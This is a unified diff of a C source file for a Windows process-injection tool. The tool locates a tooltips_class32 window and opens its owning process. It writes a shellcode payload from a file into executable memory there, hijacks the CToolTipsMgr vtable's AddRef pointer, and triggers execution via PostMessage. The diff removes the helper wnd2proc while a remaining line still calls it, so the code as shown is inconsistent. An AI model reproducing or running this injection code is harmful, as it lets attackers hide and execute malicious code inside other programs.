@@ -28,29 +28,18 @@
   POSSIBILITY OF SUCH DAMAGE. */
   
 #include "../ntlib/util.h"
-
-// classes that work
-PWCHAR class[]=
-{ L"tooltips_class32",
-  L"ForegroundStaging",
-  L"Shell_TrayWnd",
-  NULL};
   
-    LPVOID  pic;
-    DWORD   len;
-    
 typedef struct _IUnknown_VFT {
     // IUnknown
     LPVOID QueryInterface;
     LPVOID AddRef;
     LPVOID Release;
     
-    // everything from here could be anything
-    // we're only interested in the IUnknown interface
-    ULONG_PTR padding[128];
+    // CToolTipsMgr
+    LPVOID ptrs[128];
 } IUnknown_VFT;
 
-VOID comctrl_inject(PWCHAR cls, LPVOID payload, DWORD payloadSize) {
+VOID commctrl_inject(LPVOID payload, DWORD payloadSize) {
     HWND         hw = 0;
     SIZE_T       rd, wr;
     LPVOID       ds, cs, p, ptr;
@@ -60,22 +49,18 @@ VOID comctrl_inject(PWCHAR cls, LPVOID payload, DWORD payloadSize) {
     
     // 1. find a tool tip window.
     //    read index zero of window bytes
-    for(;;) {
-      hw = FindWindowEx(NULL, hw, cls, NULL);
-      if(hw == NULL) return;
-      printf("Found window %p.\n", (LPVOID)hw);
-      p = (LPVOID)GetWindowLongPtr(hw, 0);
-      if(p != NULL) break;
-    }
+    hw = FindWindow(L"tooltips_class32", NULL);
+    p  = (LPVOID)GetWindowLongPtr(hw, 0);
     GetWindowThreadProcessId(hw, &pid);
-    printf("Found window bytes %p in %i.\n", p, pid);
     
     // 2. open the process and read CToolTipsMgr
-    
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if(hp == NULL) return;
     ReadProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &rd);
     ReadProcessMemory(hp, ptr, &unk, sizeof(unk), &rd);
+    
+    //printf("HWND : %p Heap : %p PID : %i vftable : %p\n", 
+      // hw, p, pid, ptr);
     
     // 3. allocate RWX memory and write payload there.
     //    update callback
@@ -83,77 +68,24 @@ VOID comctrl_inject(PWCHAR cls, LPVOID payload, DWORD payloadSize) {
       MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
     
-    // 4. allocate RW memory and write updated CToolTipsMgr
-    unk.QueryInterface = cs;
+    // 4. allocate RW memory and write new CToolTipsMgr
+    unk.AddRef = cs;
     ds = VirtualAllocEx(hp, NULL, sizeof(unk),
       MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     WriteProcessMemory(hp, ds, &unk, sizeof(unk), &wr);
     
-    printf("Updating..");
-    
     // 5. update pointer, trigger execution
     WriteProcessMemory(hp, p, &ds, sizeof(ULONG_PTR), &wr);
     PostMessage(hw, WM_USER, 0, 0);
-    Sleep(1000);
+
+    // sleep for moment
+    Sleep(1);
     
     // 6. restore original pointer and cleanup
     WriteProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &wr);    
     VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
     VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
     CloseHandle(hp);
-}
-
-// GetWindowModuleFileName doesn't always work.
-PWCHAR wnd2proc(HWND hw) {
-    PWCHAR         name=L"N/A";
-    DWORD          pid;
-    HANDLE         ss;
-    BOOL           bResult;
-    PROCESSENTRY32 pe;
-    
-    GetWindowThreadProcessId(hw, &pid);
-    
-    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    
-    if(ss != INVALID_HANDLE_VALUE) {
-      pe.dwSize = sizeof(PROCESSENTRY32);
-      
-      bResult = Process32First(ss, &pe);
-      while (bResult) {
-        if (pe.th32ProcessID == pid) {
-          name = pe.szExeFile;
-          break;
-        }
-        bResult = Process32Next(ss, &pe);
-      }
-      CloseHandle(ss);
-    }
-    return name;
-}
-
-PWCHAR addr2sym(HANDLE hp, LPVOID addr) {
-    WCHAR        path[MAX_PATH];
-    BYTE         buf[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
-    PSYMBOL_INFO si=(PSYMBOL_INFO)buf;
-    static WCHAR name[MAX_PATH];
-    
-    ZeroMemory(path, ARRAYSIZE(path));
-    ZeroMemory(name, ARRAYSIZE(name));
-          
-    GetMappedFileName(
-      hp, addr, path, MAX_PATH);
-    
-    PathStripPath(path);
-    
-    si->SizeOfStruct = sizeof(SYMBOL_INFO);
-    si->MaxNameLen   = MAX_SYM_NAME;
-    
-    if(SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
-      wsprintf(name, L"%s!%hs", path, si->Name);
-    } else {
-      lstrcpy(name, path);
-    }
-    return name;
 }
 
 // WorkerA or WorkerW created by SHCreateWorkerWindowW
@@ -171,9 +103,6 @@ BOOL IsClassPtr(HWND hwnd, LPVOID ptr) {
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if(hp == NULL) return FALSE;
     
-    SymSetOptions(SYMOPT_DEFERRED_LOADS);
-    SymInitialize(hp, NULL, TRUE);
-    
     // read first value of pointer
     ReadProcessMemory(hp, ptr, &ds, sizeof(ULONG_PTR), &rd);
     
@@ -185,13 +114,7 @@ BOOL IsClassPtr(HWND hwnd, LPVOID ptr) {
               (mbi.Type    == MEM_IMAGE     ) && 
               (mbi.Protect == PAGE_READONLY));
             
-    if(bClass) {
-      printf("%ws - ", addr2sym(hp, ptr));
-      printf("%ws - ", addr2sym(hp, ds));
-    }
-    SymCleanup(hp);
-    CloseHandle(hp);
-    
+    CloseHandle(hp);    
     return bClass;
 }
 
@@ -212,8 +135,8 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     GetWindowThreadProcessId(hwnd, &pid);
     
     if(IsClassPtr(hwnd, cs)) {
-      printf("%p %p %-40ws %ws : %i\n", 
-          hwnd, cs, cls, wnd2proc(hwnd), pid);
+      printf("%16p %16p %-40ws %-5i %ws\n", 
+          hwnd, cs, cls, pid, wnd2proc(hwnd));
     }
     
 L1:
@@ -222,27 +145,36 @@ L1:
     return TRUE;
 }
 
-VOID comctrl_list(PWCHAR filter) {
+VOID commctrl_list(PWCHAR filter) {
+    printf("%-16s %-16s %-40s %-5s %s\n", 
+      "HWND", "WindowBytes", "Class", "PID", "Process");
+    printf("*******************************************"
+    "***************************************************\n");
+      
     EnumWindows(EnumWindowsProc, (LPARAM)filter);
 }
     
 int main(void) {
     int     argc;
-    WCHAR **argv, *filter = NULL;
+    WCHAR   **argv;
+    LPVOID  pic;
+    DWORD   len;
     
     argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
-    if(argc == 3) {
-      len = readpic(argv[1], &pic);
-      if (len==0) {
-        printf("unable to read %ws.\n", argv[1]);
-      } else {
-        comctrl_inject(argv[2], pic, len);
-      }
-    } else if(argc <= 2) {
-      if(argc == 2) filter = argv[1];
-      comctrl_list(filter);
+    // inject payload into process via tooltips_class32 control
+    if(argc != 2) {
+      printf("usage: tooltip_inject <payload.bin>\n");
+      return 0;
     }
-      
+    
+    // inject payload?
+    len = readpic(argv[1], &pic);
+    if(len != 0) {
+      commctrl_inject(pic, len);
+    } else {
+      printf("unable to read from %ws\n", argv[1]);
+      commctrl_list(argv[1]);
+    }
     return 0;
 }
